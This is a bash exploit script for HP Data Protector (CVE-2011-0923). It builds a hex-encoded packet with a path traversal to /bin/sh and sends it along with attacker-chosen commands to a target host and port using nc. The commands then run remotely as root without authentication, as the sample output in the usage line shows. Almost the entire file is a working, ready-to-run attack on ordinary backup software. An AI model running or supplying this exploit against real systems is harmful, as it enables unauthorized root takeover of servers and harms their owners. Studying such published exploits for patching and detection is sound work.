#!/bin/bash
# Exploit Title: HP Data Protector Remote Root Shell for Linux
# Date: 2011-08-10
# Author: SZ
# Software Link:http://www8.hp.com/us/en/software/software-
# product.html?compURI=tcm:245-936920&pageTitle=data-protector
# Version: 0.9
# Tested on: HP-UX, Linux
# CVE: CVE-2011-0923
# Notes: ZDI-11-055
# Reference: http://www.zerodayinitiative.com/advisories/ZDI-11-055/
# Reference: http://h20000.www2.hp.com/bizsupport/TechSupport/
# Document.jsp?objectID=c02781143
#
# Ported from HPUX to Linux: minor change /usr/bin/sh -> /bin/sh
# Ported to HPUX from fdisk's (@fdiskyou) Windows version.
# Windows version: http://www.exploit-db.com/exploits/17339/
#
[ $# -lt 3 ] && echo -en "Syntax: `basename ${0}` <host> <port> <commands>\n\n`basename ${0}` 10.22.33.44 5555 id \nX15 [12:1] uid=0(root) gid=0(root)
" && exit 0
 
HOST=`echo ${@} | awk '{print $1}'`
PORT=`echo ${@} | awk '{print $2}'`
CMD=`echo ${@} | sed 's/'$HOST'.*'${PORT}'\ \ *//g'`
SC=""
SC=${SC}"\x00\x00\x00\xa4\x20\x32\x00\x20\x2d\x2d\x63\x68\x30\x6b\x73\x2d"
SC=${SC}"\x00\x20\x30\x00\x20\x53\x59\x53\x54\x45\x4d\x00\x20\x2d\x63\x68"
SC=${SC}"\x30\x6b\x73\x2d\x2d\x00\x20\x43\x00\x20\x32\x30\x00\x20\x2d\x2d"
SC=${SC}"\x63\x68\x30\x6b\x73\x2d\x00\x20\x50\x6f\x63\x00\x20\x2d\x72\x30"
SC=${SC}"\x30\x74\x2d\x72\x30\x30\x74\x2d\x00\x20\x2d\x72\x30\x30\x74\x2d"
SC=${SC}"\x72\x30\x30\x74\x2d\x00\x20\x2d\x72\x30\x30\x74\x2d\x72\x30\x30"
SC=${SC}"\x74\x2d\x00\x20\x30\x00\x20\x30\x00\x20\x2e\x2e\x2f\x2e\x2e\x2f"
SC=${SC}"\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x2e"
SC=${SC}"\x2e\x2f\x2e\x2e\x2f\x62\x69\x6e\x2f\x73\x68\x00\x00\x00\x00\x00"
SC=${SC}"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
SC=${SC}"\x00\x00\x00\x00\x00\x00\x00\x00\x00"

SHELLCODE=${SC}
( echo -en ${SHELLCODE} ; echo ${CMD} ) | nc -w1 ${HOST} ${PORT}
